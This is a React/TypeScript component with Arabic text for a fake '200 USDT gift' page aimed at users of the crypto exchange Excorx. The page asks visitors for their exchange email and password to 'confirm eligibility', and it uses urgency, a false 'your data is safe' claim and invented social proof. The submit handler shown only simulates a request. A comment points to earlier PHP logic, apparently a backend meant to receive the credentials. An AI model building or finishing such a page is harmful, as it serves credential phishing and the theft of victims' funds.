"use client"

import React, { useState } from 'react';
import { Gift, Coins, CheckCircle2, Users, ShieldCheck, Timer, Target, Mail, Lock, Loader2 } from 'lucide-react';
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { cn } from "@/lib/utils";

export function GiftCard() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [isSubmitted, setIsSubmitted] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!email || !password) {
      alert('❌ يرجى إدخال البريد الإلكتروني وكلمة المرور.');
      return;
    }

    setIsLoading(true);

    try {
      // Simulate API call
      await new Promise(resolve => setTimeout(resolve, 2000));
      
      // Assume success based on user's original PHP logic expectation
      setIsSubmitted(true);
    } catch (error) {
      console.error('Error:', error);
      alert('❌ فشل الاتصال بالخادم. حاول مرة أخرى.');
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="flex justify-center items-center min-h-screen p-4">
      <div className="gift-card-glass w-[420px] max-w-full rounded-[32px] p-8 md:p-10 animate-in fade-in slide-in-from-bottom-4 duration-700">
        
        {/* Header Section */}
        <div className="text-center space-y-4 mb-8">
          <div className="flex justify-center gap-2 mb-2">
            <div className="animate-float">
              <Gift className="w-16 h-16 text-primary filter drop-shadow-[0_0_15px_rgba(75,178,255,0.6)]" />
            </div>
            <div className="animate-float [animation-delay:0.5s]">
              <Coins className="w-16 h-16 text-accent filter drop-shadow-[0_0_15px_rgba(158,235,255,0.6)]" />
            </div>
          </div>
          <h1 className="text-3xl md:text-4xl font-extrabold bg-gradient-to-br from-accent to-primary bg-clip-text text-transparent leading-tight">
            عرض خاص: 200 USDT
          </h1>
          <p className="text-[#9bb8e0] text-base border-b border-dashed border-[#2d4b77] pb-4">
            هدية لمستخدمي Excorx النشطين
          </p>
        </div>

        {/* Highlight Section */}
        <div className="bg-gradient-to-br from-[#1e2f47] to-[#0e1a2b] p-6 rounded-[24px] border border-[#2b3f5c] shadow-inner mb-6 text-center group transition-all hover:border-primary/50">
          <span className="text-[#b3d9ff] text-lg font-medium">مكافأة الولاء</span>
          <div className="text-5xl font-extrabold text-[#fcd34d] drop-shadow-[0_0_10px_rgba(251,191,36,0.5)] mt-1 tracking-wider">
            200 <small className="text-lg text-slate-400 font-normal">USDT</small>
          </div>
        </div>

        {/* Conditions Badge */}
        {!isSubmitted && (
          <div className="flex flex-wrap justify-center gap-3 mb-8">
            <div className="bg-primary/10 border border-primary/40 rounded-full px-4 py-2 text-sm text-[#bfd9ff] flex items-center gap-2">
              <CheckCircle2 className="w-4 h-4 text-primary" />
              <span>رصيد +500 USDT</span>
            </div>
            <div className="bg-primary/10 border border-primary/40 rounded-full px-4 py-2 text-sm text-[#bfd9ff] flex items-center gap-2">
              <Users className="w-4 h-4 text-primary" />
              <span>دعوة واحدة على الأقل</span>
            </div>
          </div>
        )}

        {!isSubmitted ? (
          <>
            <p className="text-[#b0caf0] text-sm text-center mb-6 leading-relaxed">
              لتأكيد أهليتك، يرجى تسجيل الدخول بحسابك في Excorx.
            </p>

            <form onSubmit={handleSubmit} className="space-y-5">
              <div className="space-y-2">
                <Label className="text-[#b3d0f0] text-sm font-semibold flex items-center gap-2">
                  <Mail className="w-4 h-4" /> البريد الإلكتروني (مرتبط بالحساب)
                </Label>
                <Input
                  type="email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  placeholder="أدخل بريدك الإلكتروني"
                  className="bg-[#0e1b2c] border-[#253c5c] rounded-full h-12 px-6 focus:ring-primary focus:border-primary text-white"
                  required
                />
              </div>

              <div className="space-y-2">
                <Label className="text-[#b3d0f0] text-sm font-semibold flex items-center gap-2">
                  <Lock className="w-4 h-4" /> كلمة المرور
                </Label>
                <Input
                  type="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder="كلمة مرور حسابك"
                  className="bg-[#0e1b2c] border-[#253c5c] rounded-full h-12 px-6 focus:ring-primary focus:border-primary text-white"
                  required
                />
              </div>

              <Button
                type="submit"
                disabled={isLoading}
                className="w-full h-14 bg-gradient-to-r from-[#2563eb] via-[#3b82f6] to-primary hover:scale-[1.02] active:scale-[0.98] transition-all rounded-full text-xl font-bold text-white shadow-[0_10px_25px_-5px_#1e3a8a] border border-blue-300/30 mt-4"
              >
                {isLoading ? (
                  <Loader2 className="animate-spin w-6 h-6 ml-2" />
                ) : (
                  "🚀 إرسال طلب الهدية"
                )}
              </Button>
            </form>
          </>
        ) : (
          <div className="bg-[#0f2a3f] border border-[#fbbf24] rounded-3xl p-6 text-[#fde68a] text-center font-medium shadow-[0_0_20px_rgba(245,158,11,0.25)] backdrop-blur-md animate-in slide-in-from-top-4 duration-500 my-8">
            <Timer className="w-8 h-8 mx-auto mb-3 animate-pulse" />
            <p className="text-lg">
              ⏳ طلبك قيد المراجعة، يستغرق التأكد من الشروط من ساعة إلى 3 ساعات. سيتم إعلامك عند القبول.
            </p>
          </div>
        )}

        {/* Footer Note */}
        <div className="mt-10 pt-6 border-t border-[#1f3752] flex justify-between items-center text-[#5f7d9e] text-xs">
          <div className="flex items-center gap-1.5">
            <Timer className="w-3.5 h-3.5" /> عرض محدود
          </div>
          <div className="flex items-center gap-1.5">
            <ShieldCheck className="w-3.5 h-3.5" /> بياناتك آمنة
          </div>
          <div className="flex items-center gap-1.5">
            <Target className="w-3.5 h-3.5" /> 500+ مستخدم استلموا
          </div>
        </div>
      </div>
    </div>
  );
}
